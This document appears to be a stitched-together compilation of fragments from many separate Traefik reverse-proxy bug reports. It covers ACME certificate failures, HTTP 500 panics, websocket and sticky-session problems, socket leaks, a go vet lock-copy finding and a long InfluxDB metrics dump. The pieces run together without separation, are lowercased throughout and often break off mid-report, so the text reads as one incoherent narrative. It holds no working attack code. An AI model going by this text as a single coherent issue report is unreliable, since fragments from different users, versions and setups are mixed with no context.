no content, just a http 200 instead of expected content, evne with no request body on a get request
in traefik's log, this message is spammed en masse:
time="2018-10-17t07:51:09z" level=error msg="open /tmp/temp-multibuf-691319615: no such file or directory"
it would appear /tmp is not writable in the non-alpine container
switching to 1.7.3-alpine allows the configuration to work, and content is received as expected.
$ curl --insecure -h 'host: server' --cacert certs/ca/crt.pem --cert certs/cli/crt.pem --key certs/cli/key.pem
cert/subject: cn=cert-experiments.cern.ch,o=my awesome org,c=ch (15392751396577182173)
get / http/1.1
host: server
accept: */*
accept-encoding: gzip
user-agent: curl/7.58.0
x-forwarded-for: 128.141.194.164
x-forwarded-host: server
x-forwarded-port: 443
x-forwarded-proto: https
x-forwarded-server: cert-experiments-3eenymnvlt3a-minion-0.cern.ch
x-real-ip: 128.141.194.164
i got the uri with no trailling question mark so the uri became ### the context
i had this issue in a bigger project where we used hapi and the hawk authentification scheme
since the ressource is different between the server and the client the mac calculation was altered and produced a bad mac error on queries with empty query strings
we can fix this by normalzing our urls but we didn't not expect traefik to alter the ressource url.
also chrome devtools shows the uri before alteration when you check the headers which was misleading for us since hapi was showing a different one tthan in the devtools and got us question our nginx config.
### related discussion
this discussion may be related to the issue here
white page, not loading in the kubernetes log of the deamon set i found:
level=error msg="recovered from panic in http handler: net/http: abort handler"`
`level=error msg="undefined entry point(s) \'https\' for <domainname>"`
set in your domain name.
traefik returned 500 internal server error on every request that was routed to the backend with the `retryexpression` label
all other backends without the label are operating as expected.
time="2018-10-10t19:48:20z" level=error msg="caught http status code 503, returning error page"
time="2018-10-10t19:48:20z" level=debug msg="reporting span 6dd11af5a0cce03d:13a5eb1db3b05976:6dd11af5a0cce03d:1"
time="2018-10-10t19:48:20z" level=error msg="recovered from panic in http handler: runtime error: invalid memory address or nil pointer dereference" ```
many malformed errors being returned to traefik users indicating that a neworder request was received containing identifiers with a trailing period character, not a valid domain name
i expect this is a result of browsers/https user-agents sending a request to a domain with a trailing period backed by a traefik instance that doesn't strip the trailing period before creating an order with lego/let's encrypt
it probably makes sense for traefik to be responsible for stripping that trailing period instead of handling that corner-case in lego.
traefik seems to abort the load of all certificates, including the good ones.
larger messages are received immediately, small messages got buffered for approx
100ms and then send.
websocket: bad handshake with resp: 404
- get requests to this ingress without a request body lead to panic in traefik: `recovered from panic in http handler: runtime error: invalid memory address or nil pointer dereference`
- get requests to this ingress with a request body greater than 8b get rejected as expected
here i'm using httpie to generate three requests to a simple python service that should just repeat request data and headers to the client when serving a get request: no body data - causes http 500 to be returned to the client: ```console
$ http get
http/1.1 500 internal server error
content-length: 22
content-type: text/plain; charset=utf-8
date: wed, 10 oct 2018 08:59:32 gmt
vary: accept-encoding
x-content-type-options: nosniff internal server error
``` adding file larger than 8b to body: ```console
$ http get < largerfile.txt
http/1.1 413 request entity too large
content-length: 24
content-type: text/plain; charset=utf-8
date: wed, 10 oct 2018 08:59:36 gmt
vary: accept-encoding request entity too large
``` sending file smaller than 8b: ```console
$ http get < smallfile.txt
http/1.1 200 ok
access-control-allow-origin: *
content-length: 486
content-type: application/json
date: wed, 10 oct 2018 08:59:45 gmt
server: 0.0.0.0
strict-transport-security: max-age=15553000
vary: accept-encoding
x-content-type-options: nosniff
x-frame-options: deny
x-xss-protection: 1; mode=block { "request.data": "sadasd\ ", "request.headers": { "accept": "application/json, */*", "accept-encoding": "gzip, deflate", "content-length": "7", "content-type": "application/json", "host": "oho.domain.com", "user-agent": "httpie/0.9.9", "x-forwarded-for": "8.8.8.8", "x-forwarded-host": "oho.domain.com", "x-forwarded-port": "443", "x-forwarded-prefix": "/api", "x-forwarded-proto": "https", "x-forwarded-server": "traefik-ingress-controller-86949d84c5-p9m8w", "x-real-ip": "8.8.8.8" }
i have to restart the docker image ,in order to load the configurations inside the subdirectories that are creating dynamically.
internal server error
i can see a dns record being created, but it seems that treafik failed to verified hence the certificate could not be issued
here is the entry from gandi
`_acme-challenge txt 300 "cgzfmkwmxpe8ch4towrr6lgr2rrnkz0qw7vv_q398v8"`
no set-cookie header ### output of `traefik version`: v1.7.0 / maroilles ```
v1.7.0 / maroilles
traefik changes the certificates correctly, until this message appears in the debug log: ```
erro[2018-10-03t09:45:23-03:00] failed to retrieve marathon applications: all the marathon hosts are presently down
``` as soon as this message appears, traefik **does not** detect the file change anymore and then the certificates stop being reloaded.
sometimes, like every second or third request traefik does not respond and i get a operation timeout
this happens to all my services and also to the dashboard of traefik
there aren't any special logs or events, which give me a clue why this happens
this issue happens when using the browser, curl, postman etc
so it's definitely an issue with traefik (or my configuration)
the service to service communications works as expected, when sending requests within the cluster to service-name.namespace.cluster.local
so kubernetes works as expected.
the ip of traefik container in the traefik network.
here is the error i get (changed the actual domain):
time="2018-09-30t16:01:53z" level=error msg="error obtaining certificate: acme: error -> one or more domains had a problem:\ [example.com.com] time limit exceeded
last error: ns ns-1416.awsdns-49.org
did not return the expected txt record\ "
time="2018-09-30t16:01:53z" level=error msg="unable to obtain acme certificate for domains \\"*.example.com.com,example.com.com\\" : unable to generate a certificate for the domains [*.example.com.com example.com.com]: acme: error -> one or more domains had a problem:\ [example.com.com] time limit exceeded
last error: ns ns-1416.awsdns-49.org
did not return the expected txt record\ "
my acme.json is created just fine.
i see the txt for acme in route 53:
![screenshot-console aws amazon com-2018 09 30-12-11-23](
i tried deleting the acme.json file and restarting the container multiple times
no resolution here!
setting a delay of 60s did not fix this
thanks in advance for any help
_originally posted by @gurumark in #issuecomment-425732727_
i could knock out the traefik's ingresss controller for the entire cluster by using the wrong characters in the path for everyone.
traefik 1.7 generates error message during start:
time="2018-09-28t16:42:19z" level=error msg="error creating server: open : no such file or directory"
``` traefik 1.7 is not serving any traffic on port 8080:
curl -svko /dev/null
traefik seems to "hang up" on consul, leaving it in a completely disconnected state.
isle-proxy-ld | time="2018-09-27t19:31:37z" level=error msg="undefined backend \'backend-traefik-isledevelopment\' for frontend frontend-host-admin-isle-localdomain-1
skipping frontend frontend-host-admin-isle-localdomain-1..."
isle-proxy-ld | time="2018-09-27t19:31:37z" level=error msg="undefined backend \'backend-isle-portainer-isledevelopment\' for frontend frontend-host-portainer-isle-localdomain-0
skipping frontend frontend-host-portainer-isle-localdomain-0..."
isle-proxy-ld | time="2018-09-27t19:31:39z" level=error msg="undefined backend \'backend-traefik-isledevelopment\' for frontend frontend-host-admin-isle-localdomain-2
skipping frontend frontend-host-admin-isle-localdomain-2..."
isle-proxy-ld | time="2018-09-27t19:31:39z" level=error msg="undefined backend \'backend-apache-isledevelopment\' for frontend frontend-host-isle-localdomain-pathprefix-adore-djatoka-cantaloupe-0
skipping frontend frontend-host-isle-localdomain-pathprefix-adore-djatoka-cantaloupe-0..."
isle-proxy-ld | time="2018-09-27t19:31:39z" level=error msg="undefined backend \'backend-isle-portainer-isledevelopment\' for frontend frontend-host-portainer-isle-localdomain-1
skipping frontend frontend-host-portainer-isle-localdomain-1..."
``` ### output of `traefik version`: ```
version: v1.7.0
codename: maroilles
go version: go1.11
built: 2018-09-24_09:57:21am
os/arch: linux/amd64
``` ### what is your environment & configuration:
docker on centos; docker on mac os.
toml config:
docker-compose: (have since downgraded from `latest` to `1.6`)
thank you!
when i navigate to `mydomain.com` i receive an ssl error, when i navigate to `foo.mydomain.com` i get the letsencrypt wildcard cert
when i configure traefik without letsencrypt, it works.
traefic serves the default certificate ### what was your workaroud? downgraded to 1.6.6 without any configuration change
traefik acts as expected
$ docker pull traefik
using default tag: latest
latest: pulling from library/traefik
no matching manifest for unknown in the manifest list entries $ docker pull traefik:alpine
using default tag: latest
latest: pulling from library/traefik
no matching manifest for unknown in the manifest list entries
i saw acme certificate generation logs for **stack-test2.my-domain.pro** (see log section)
the backend does not work until i click "finish upgrade" in rancher.
multiple requests being made in jumbled order
while its not shown in the logs below i believe it essentially sets the dns token and then the other thread comes along and overwrites it leading to a failure and restart
### output of `traefik version`: ```
v1.7.0-rc5 (alpine docker)
traefik keeps openning new sockets until file descriptors max are reached causing **too many open files**.
not all traefik node acknowledge new certificate, but some ### output of `traefik version`: ```
version: v1.6.6
codename: tetedemoine
go version: go1.10.3
built: 2018-08-20_01:10:06pm
os/arch: linux/amd64 ``` ### what is your environment & configuration? we run traefik in kubernetes using daemonset
this is our args:
``` - --defaultentrypoints=http,https - --entrypoints=name:http address::80 compress:true - --entrypoints=name:https address::443 tls compress:true - --entrypoints=name:api address::8080 - --api - --api.dashboard - --api.entrypoint=api - --api.statistics - --etcd - --etcd.endpoint=etcd.example.com:2379 - --etcd.trace - --etcd.watch - --etcd.useapiv3 - --etcd.prefix=/traefik - --kubernetes - --kubernetes.watch - --acme - --acme.dnschallenge.provider=rfc2136 - --acme.email=support@asergis.com - --acme.storage=/traefik/acme/account - --acme.entrypoint=https - --acme.acmelogging - --acme.dnschallenge - --acme.dnschallenge.delaybeforecheck=3 - --acme.onhostrule - --loglevel=info - --ping - --ping.entrypoint=api
* traefik creates a txt record, deletes it, creates a new one and deletes that too (after the challenge failed)
* dns challenge expects second txt record but gets first, thus fails
all of the exisiting rules were not recognised and respective back-ends disappeared from traefik dashboard
the creation fails with: ```
unable to obtain acme certificate for domains \\"myhost.sub.mydomain.tld\\" detected thanks to rule \\"host:myhost.sub.mydomain.tld\\" : cannot obtain certificates: acme: error -> one or more domains had a problem:\ [myhost.sub.mydomain.tld] error presenting token: zone does not exist\
**short version**
* randomly initiated traefik instances, some have an acme certificate some not
* if the acme cert was not acquired the entrypoint falls back to the traefik dummy cert **long version**
* i did a 1.7 latest build with added logging `docker run zyclonite/traefik:acme_cert_resolve_issue` (
* this shows that before an acme cert is requested, traefik checks for several existing certificates (static, dynamic, acme, resolved...)
* it seems this list of certificates is not always the same, due to async loading and resolving during startup..
in one scenario, below the logs, an internal cert matches one of the acme entrypoint hostnames and so it's not getting requested from the lets encrypt service
* i would have expected to see only the acme certificates to be matched in the first place, because there is anyway an entrypoint in the acme configuration
* access directly through ( displays the *main app* header and the traefik logo
* the app displaying a main app header and the traefik logo, going through traefik with a /my-app/ path: (
* the app displaying a main app header but a broken image for the traefik logo through traefik with a /my-app path: (
pair a: the expected behavior
pair b: healthchecks hitting both servers (this might be ok), requests routing to both servers
i'm guessing the healthcheck code is overriding the allowminweightzero code.
no certificate was generated and had `error in go routine: runtime error: invalid memory address or nil pointer dereference` in the log.
since we run traefik (15/08) we observed a significant increase of the cpu usage on marathon leader (see below graphs): ![alt text]( "cpu stats") we stopped all traefik containers on 21/08, cpu usage and load decrease immediately
i quickly investigated how traefik fetch marathon informations (i did a tcpdump).
i saw the following request made repeatedly: ```
get //v2/apps?embed=apps.tasks&embed=apps.deployments&embed=apps.readiness http/1.1
host: mesos.lan:8080
user-agent: go-http-client/1.1
accept: application/json
content-type: application/json
accept-encoding: gzip
``` this requests returns informations about all tasks running and seems to be quite resource consuming for the marathon leader
first i'm wondering if my configuration is ok or if i missed something
then, marathon exposes an event bus endpoint ( i quickly checked traefik dependencies, it seems that it uses the following lib to interact with marathon which seems to be able to handle that stream
i would like to know if there is a way/possible to configure traefik to subscribe to that event bus instead of querying /v2/apps endpoint.
$ gometalinter.v2 --vendor --disable-all --enable=vet ./...
acme/acme.go:196::error: assignment copies lock value to domainscerts: acme.domainscertificates contains sync.rwmutex (vet) acme/acme_test.go:351::error: literal copies lock value from domainscertificates: acme.domainscertificates contains sync.rwmutex (vet)
acme/acme_test.go:807::error: literal copies lock value from *test.dc: acme.domainscertificates contains sync.rwmutex (vet)
provider/kubernetes/kubernetes_test.go:1768::error: range var test copies lock: struct{desc string; provider kubernetes.provider; expected *github.com/containous/traefik/types.configuration} contains kubernetes.provider contains github.com/containous/traefik/safe.safe contains sync.rwmutex (vet)
provider/kubernetes/kubernetes_test.go:1769::error: assignment copies lock value to test: struct{desc string; provider kubernetes.provider; expected *github.com/containous/traefik/types.configuration} contains kubernetes.provider contains github.com/containous/traefik/safe.safe contains sync.rwmutex (vet)
``` looks like `go vet` found a code bug in `acme/acme.go:196`
there are few similar issues in test code
`sync.rwmutex` is copied in line 196 (`domainscerts = account.domainscertificate`) and [golang sync package states]( #rwmutex) that `a rwmutex must not be copied after first use
this line will be executed when `account != nil` and the rwmutex is going to be used in the same function in `account.init()` in the first line (`err := a.domainscertificate.init()`) ```go
func (a *acme) leadershiplistener(elected bool) error { if elected { _, err := a.store.load() if err != nil { return err } transaction, object, err := a.store.begin() if err != nil { return err } account := object.(*account) account.init() // reset account values if caserver changed, thus registration uri can be updated if account != nil && account.registration != nil && !isaccountmatchingcaserver(account.registration.uri, a.caserver) { log.info("account uri does not match the current caserver
the account will be reset") account.reset() } var needregister bool if account == nil || len(account.email) == 0 { domainscerts := domainscertificates{certs: []*domainscertificate{}} if account != nil { domainscerts = account.domainscertificate /// <<---- here sync.rwmutext is copied } account, err = newaccount(a.email, domainscerts.certs, a.keytype) if err != nil { return err } needregister = true } a.client, err = a.buildacmeclient(account) if err != nil { return err } if needregister { // new users will need to register; be sure to save it log.debug("register...") reg, err := a.client.register(true) if err != nil { return err } account.registration = reg } err = transaction.commit(account) if err != nil { return err } a.retrievecertificates() a.renewcertificates() a.runjobs() } return nil
traefik fails parsing the configuration above provided by kubernetes.
also, it claims there are no secrets in the current namespace.
traefik is using the wildcard for which causes a warning on my browser.
```traceback (most recent call last): file "greeter_client.py", line 18, in <module> run() file "greeter_client.py", line 13, in run response = stub.sayhello(helloworld_pb2.hellorequest(name=\'you\')) file "/usr/local/lib/python2.7/site-packages/grpc/_channel.py", line 500, in __call__ return _end_unary_response_blocking(state, call, false, none) file "/usr/local/lib/python2.7/site-packages/grpc/_channel.py", line 434, in _end_unary_response_blocking raise _rendezvous(state, none, none, deadline)
grpc._channel._rendezvous: <_rendezvous of rpc that terminated with (statuscode.cancelled, received http2 header with status: 500)>
this error :
traefik remove trailing slash from path.
provider connection error serializationexception: status code: 400, request id: 279485fa-9f13-11e8-a3c7-9510e5251df9, retrying in 714.423969ms
the following error message : ```sh
time="2018-08-08t17:46:15z" level=error msg="unable to obtain acme certificate for domains \\"*.mydomain.com\\" : unable to generate a certificate for the domains [*.mydomain.com]: acme: error -> one or more domains had a problem:\ [mydomain.com] error presenting token: gandi dns: findzonebyfqdn failure: could not find the start of authority\ " ```
a 404 message
cache clears and different browsers, or access points did not resolve the issue
started arround 13:00 gmt
i see the name of the first frontend (alphabetically) which has the same backend as the requested one
for example i request host: n.example.net but in the accesslog file i see `frontendname` from host: c.example.net.
our setup have an classic aws elb forwarding to nodeport on kubernetes stack
works brilliant with replicas=1
with replicas > 1 the subsequent calls on els to the same api timesout
helm install --name traefik-with-ui --namespace kube-system --set replicas=5,imagetag=1.6.5,servicetype=nodeport,service.nodeports.http=30953,service.nodeports.dashboard=30954,dashboard.enabled=true,cpulimit=800m,memorylimit=500mi,memoryrequest=200mi stable/traefik
``` its reproducable, that the change of replicas induce that timeout.
however, both are set up as backend for the same fronted, and doing a wrr load balancing.
in case of request to `api.my-domain.com/v1/my-subpath/products`: - http 404 not found - the request is being routed to `/v1/my-subpath/products`
in case of request to `api.my-domain.com/v1/my-subpath/products/`: - http 200 success - the request is being routed to `/api/v1/products/`
route rule (as written on dashboard) - `replacepathregex ^/v1/my-subpath/products/(.*) /api/v1/products/$1`
the host used in the backend configuration.
503 pages as traefik kept on using the old ips of alb1.
traefik showing the front-end configuration on left, but on the right-end it does not show any backend details
server,url, weight al are blank
it shows load balancer : wrr
traefik using the default behavior of the gorilla websocket lib, making it non transparent
mening that protocol built on top of websockets have to re-implemented general ping/pong behavior with opcode 1 (plain text) or opcode 2 (binary data)
traefik dumping my private ssl certs to standard out
which would be fine if i wasn't running in kubernetes which pushes all logs to our log collector.
time="2018-07-24t15:42:43z" level=error msg="error configuring tls for ingress web/api: secret web/traefik-cert does not exist"
time="2018-07-24t15:42:43z" level=error msg="error configuring tls for ingress web/web: secret web/traefik-cert does not exist"
time="2018-07-24t15:42:43z" level=error msg="error configuring tls for ingress web/store: secret web/traefik-cert does not exist"
time="2018-07-24t15:42:43z" level=error msg="error configuring tls for ingress web/services: secret web/traefik-cert does not exist"
time="2018-07-24t15:42:43z" level=debug msg="creating entry point redirect http -> https"
time="2018-07-24t15:42:44z" level=debug msg="received kubernetes event kind *v1.secret"
time="2018-07-24t15:42:44z" level=debug msg="received kubernetes event kind *v1.secret"
time="2018-07-24t15:42:44z" level=debug msg="received kubernetes event kind *v1.secret"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) this is the cause of the error logs in #3402, as the secrets _do_ exist, they are just not sync'd yet.
the log message always seems to show the first frontend (alphabetically) from consul.
my private key
debu[2018-07-20t15:52:34+02:00] building acme client..
debu[2018-07-20t15:52:34+02:00] info[2018-07-20t15:52:34+02:00] register..
info[2018-07-20t15:52:34+02:00] legolog: [info] acme: registering account for test@mydomain.com ```
the download aborts after a short time and the downloaded data is not complete
most of the time, during our local tests, we were only able to download something in the range of 3-6mb
without the ```bash
--limit-rate=100k
this just works fine.
traefik terminates shortly after reaching `lifecycle.requestacceptgracetimeout` and does not give the existing websocket connections time to end gracefully.
time="2018-07-16t12:35:53z" level=error msg="unable to describe container instances: invalidparameterexception: instanceids can have at most 100 items.\ \\tstatus code: 400, request id: c74a8f28-88f4-11e8-bad3-0f447d092cd4"
in traefik dashboard - backend for `test` was `172.18.0.2:8080`
traefik crashing with a traceback
tried this on both my kubernetes cluster and on my local os x system with similar results.
executing the following: `curl --verbose -l -k --header 'host: target.com' ' ` gets us:
get / http/1.1
http/1.1 503 service unavailable
i had some tls / acme issues, because requests were stuck in establishing secure connection.
while i was searching what is wrong, i saw traefik crashing after sometime.
backend recieve "get /demo http/1.1" ### output of traefik version: (what version of traefik are you using?)
traefik:1.6.3
nginx-ingress-controller:0.15.0
server random restart
after a certain amount of connections from a single ip, traefik will no longer proxy connections from that ip.
a large number shown by duration in accesslog
"4th 2018, 09:37:44.004 bxr.eduwxt.com" "get /dmc/index.26938449.css http/1.1" "200" "24,534,228" "220,354"
duration:24,534,228
traefik panic'd constnatly.
time="2018-06-10t21:15:43z" level=error msg="unable to obtain acme certificate for domains \\"*.everydomain.com,everydomain.com\\" : cannot obtain certificates: acme: error -> one or more domains had a problem:\ [everydomain.com] acme: error 403 - urn:ietf:params:acme:error:unauthorized - incorrect txt record \\"hash here\\" found at _acme-challenge.everydomain.com\ "
points of interest:
this only happens if the wildcard domains is listed with the main domain.
setting a delay of 5s did not fix this.
it is apparently able to set the txt record; i'm not getting a permission error.
i believe the provider (cloudflare) has to verify that txt record is set before acme even checks?
`http/2 401`
no certificate is generated, but an error appears in the log (see below)
program hanged infinited ```
^cinfo[2018-06-05t18:40:02+08:00] i have to go..
info[2018-06-05t18:40:02+08:00] stopping server gracefully debu[2018-06-05t18:40:02+08:00] waiting 10s seconds before killing connections on entrypoint https..
debu[2018-06-05t18:40:02+08:00] waiting 10s seconds before killing connections on entrypoint http..
debu[2018-06-05t18:40:02+08:00] entrypoint http closed debu[2018-06-05t18:40:12+08:00] wait is over due to: context deadline exceeded
error: http 500, internal server error
![image](
a lot of logs with the following messages: ```
time="2018-05-29t09:27:15z" level=error msg="unable to parse address: 123.45.67.891, 55.111.50.11: can\'t parse ip from address 123.45.67.891, 55.111.50.11"
``` ### configuration relevant bits with forwarded headers
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] regex = "^ " replacement = " " [entrypoints.http.forwardedheaders] trustedips = ["123.211.0.0/22", "1.2.3.4/16"] [entrypoints.internal] address = ":8081" [entrypoints.internal.forwardedheaders] trustedips = ["123.211.0.0/22", "1.2.3.4/16"]
error from server (forbidden): secrets "dex-tls" is forbidden: user "gem-lb-traefik" cannot get secrets in the namespace "default"
traefik keeps the backend list as it is during the last restart/reload of traefik service.
may 23rd 2018, 11:53:35.000 | time="2018-05-23t09:53:35z" level=error msg="error adding acme certificate for domain [\\"*.mydomain.io\\" \\"mydomain.io\\"]: tls: failed to find any pem data in certificate input"
may 23rd 2018, 11:53:34.000 | time="2018-05-23t09:53:34z" level=error msg="datastore sync error: object lock value: expected 26552e5d-acd1-4686-b2c9-f1af701f227d, got 457e9bd6-0a4a-437b-b9de-62a97cc5a3ef, retrying in 349.512489ms"
may 23rd 2018, 11:53:33.000 | legolog: 2018/05/23 09:53:33 [info][*.mydomain.io, mydomain.io] acme: obtaining bundled san certificate
may 23rd 2018, 11:53:32.000 | time="2018-05-23t09:53:32z" level=error msg="datastore sync error: object lock value: expected 457e9bd6-0a4a-437b-b9de-62a97cc5a3ef, got a74a7c07-8ab5-40cb-b995-1a9ff12da459, retrying in 601.579434ms"
``` same issue with dns-01 challenge and aws provider, but the cname dns validation record got created
rolling back to 1.5.3, got my certs.
`traefik_entrypoint_requests_total{code="500"}` had a value of around 8000, whereas the total for `traefik_backend_requests_total{code="500"}` was around 8
the value of the entrypoints metric was reflected in the access log
additionally, running `traefik bug` as suggested completely removed these stats which preventing me from providing more exact values
oddly, stats for other status codes (200, 302) are still present.
the sticky session cookies is not created and the session is not sticky
it works great for non websocket services
http request:
get ws://www.mydomain.com/ws-echo http/1.1
host: www.mydomain.com
connection: upgrade
pragma: no-cache
cache-control: no-cache
upgrade: websocket
origin:
sec-websocket-version: 13
user-agent: mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.170 safari/537.36
accept-encoding: gzip, deflate
accept-language: en-us,en;q=0.9,fr-ch;q=0.8,fr;q=0.7
cookie: test-cookie=whatever
sec-websocket-key: zbl1pmw2bv/lq4tcimzryw==
sec-websocket-extensions: permessage-deflate; client_max_window_bits
sec-websocket-protocol: control
``` http response:
http/1.1 101 switching protocols
upgrade: websocket
connection: upgrade
sec-websocket-accept: zdu6v6ksalkveby3l7zynffmeci=
sec-websocket-protocol: data
server: websocket++/0.7.0
the dashboard shows the stickiness as enabled:
![screenshot from 2018-05-17 14-48-42](
neither backend service registers
traefik dashboard ui is entirely blank except for header
errors are not visible unless viewing traefik logs on server.
"internal server error" and errors in the logs
some other api services started producing a 404
after removing custom error config labels from the test service i had to restart the traefik container before the test service or the other api services would load properly.
errors such as: ```
time="2018-05-09t10:06:31z" level=error msg="unable to obtain acme certificate for domains \\"<ur>\\" detected thanks to rule \\"host:<url>\\" : cannot get acme client directory missing new registration url"
another (albeit matching certificate being used intermittently)
this can cause issues with clients that have trusted certificates, or that are not able to handle wildcard certificates.
with 1.6.0, shows "no providers found.", and spawns http 404 errors because it requests \'/api/providers\' which is routed to another project.
- no basic auth
- no redirect
new/changed certificates are not detect and are not getting loaded.
started getting the following error when traefik started up, and the file backend would not load:
level=error msg="error starting provider *file.provider: template: /etc/traefik.d/traefik.toml:261: function \\"gettag\\" not defined"
traefik failed to reload config on ingress change, and failed to load other ingresses on restart.
the number of used sockets started increasing, and i have to kill all traefik containers about once a day (see screenshot)
![screenshot 2018-04-27 11 31 45_preview](
at the beginning everything works perfect, but after some time services are not recognized any more by traefik.
the webapi gui is available but shows wrong backend ip adresses.
`docker.tls.ca` is loaded as an empty string
traefik sent a websocket close frame with close code 1006
note that according to rfc6455 1006 should never be sent on the wire.
- my requests from 217.117.24.41 were rejected
- log message - `level=debug msg="source-ip 10.200.3.76 matched none of the white list - rejecting"`
- there are no labels related to whitelist on web dashboard when `sourcerange` is extended with internal network ip range `"traefik.frontend.whitelist.sourcerange": "217.117.24.41/32,10.200.0.0/16"` - request is allowed to go through
pointing to the issue with `usexforwardedfor`
output for `whoami` service when source range is "217.117.24.41/32,10.200.0.0/16":
hostname: b1aa20b676fc
ip: 127.0.0.1
ip: 172.17.0.2
get / http/1.1
host: whoami.myhost.com
x-forwarded-for: 217.117.24.41, 10.200.2.195
x-forwarded-host: whoami.myhost.com
x-forwarded-port: 80
x-forwarded-proto: http
x-forwarded-server: e9320ec456ca
x-real-ip: 10.200.2.195
xmlhttprequesterror 502 bad gateway
metrics in prometheus, but no working server
i saw a certificate named traefik default cert, but was expired
using a chrome browser, the 'not valid before' and 'not valid after' times were identical
a lot of not closed network connections in established state.
connections number is grow until all kernel's sockets is used, and traefik throw a 'maximum number of open files is reached' error.
restart of traefik service flushes old connections, and start normal operations until limit reached again.
500 500 200 200 500 500 500 500 500 500 ``` with no error message in the logs.
changes are properly updated, but in case of deregistering and registering same service there are issues
also i believe i could misconfigured something, would appreciate for hints
metrics grouped by backend that included _all_ backend hosts and not just the hosts/urls associated with that backend
traefik is publishing on the 10 second interval - however - it is publishing data for _all_ hosts not just the hosts associated with the reported/tagged backend
looking at the data - it appears to cycle through all backend hosts over time
<summary>raw data from influx:</summary> ```
> select * from "traefik.entrypoint.requests.total" where "environment" = \'test\' limit 200
name: traefik.entrypoint.requests.total
time cluster role team agent az backend code collectiontype count entrypoint environment host method protocol url
---- ------- ---- ---- ----- -- ------- ---- -------------- ----- ---------- ----------- ---- ------ -------- ---
1523048652804381015 ops-traefik-test traefik ops telegraf us-east-1b primespeed_load_generator 200 application 18 https test ops-traefik-test-7.dm.vpc post http
1523048662804337838 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 54 https test ops-traefik-test-7.dm.vpc post http
1523048672804352766 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 33 https test ops-traefik-test-7.dm.vpc post http
1523048682804303043 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 34 https test ops-traefik-test-7.dm.vpc post http
1523048692804328428 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 53 https test ops-traefik-test-7.dm.vpc post http
1523048702804290241 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 63 https test ops-traefik-test-7.dm.vpc post http
1523048712804290875 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 70 https test ops-traefik-test-7.dm.vpc post http
1523048722804273462 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 83 https test ops-traefik-test-7.dm.vpc post http
1523048732804352153 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 65 https test ops-traefik-test-7.dm.vpc post http
1523048742804315104 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 58 https test ops-traefik-test-7.dm.vpc post http
1523048752804264041 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 75 https test ops-traefik-test-7.dm.vpc post http
1523048762804314674 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 52 https test ops-traefik-test-7.dm.vpc post http
1523048772804341681 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 74 https test ops-traefik-test-7.dm.vpc post http
1523048782804244093 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 59 https test ops-traefik-test-7.dm.vpc post http
1523048792804356653 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 60 https test ops-traefik-test-7.dm.vpc post http
1523048802804311266 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 53 https test ops-traefik-test-7.dm.vpc post http
1523048812804365088 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 66 https test ops-traefik-test-7.dm.vpc post http
1523048822804345775 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 59 https test ops-traefik-test-7.dm.vpc post http
1523048832804319448 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 59 https test ops-traefik-test-7.dm.vpc post http
1523048842804296719 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 87 https test ops-traefik-test-7.dm.vpc post http
1523048852804354296 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 54 https test ops-traefik-test-7.dm.vpc post http
1523048862804404858 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 43 https test ops-traefik-test-7.dm.vpc post http
1523048872804315095 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 65 https test ops-traefik-test-7.dm.vpc post http
1523048882804370672 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 51 https test ops-traefik-test-7.dm.vpc post http
1523048892804333487 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 61 https test ops-traefik-test-7.dm.vpc post http
1523048902804336626 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 58 https test ops-traefik-test-7.dm.vpc post http
1523048912804363902 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 55 https test ops-traefik-test-7.dm.vpc post http
1523048922810333089 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 41 https test ops-traefik-test-7.dm.vpc post http
1523048932804359360 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 61 https test ops-traefik-test-7.dm.vpc post http
1523048942808725742 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 63 https test ops-traefik-test-7.dm.vpc post http
1523048952804251785 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 75 https test ops-traefik-test-7.dm.vpc post http
1523048962804295187 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 67 https test ops-traefik-test-7.dm.vpc post http
1523048972804310889 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 53 https test ops-traefik-test-7.dm.vpc post http
1523048982804286466 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 62 https test ops-traefik-test-7.dm.vpc post http
1523048992804356320 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 89 https test ops-traefik-test-7.dm.vpc post http
1523049002804326366 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 44 https test ops-traefik-test-7.dm.vpc post http
1523049012804290215 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 99 https test ops-traefik-test-7.dm.vpc post http
1523049022804275382 ops-traefik-test traefik ops telegraf us-east-1b translateproxy 200 application 74 https test ops-traefik-test-7.dm.vpc post http
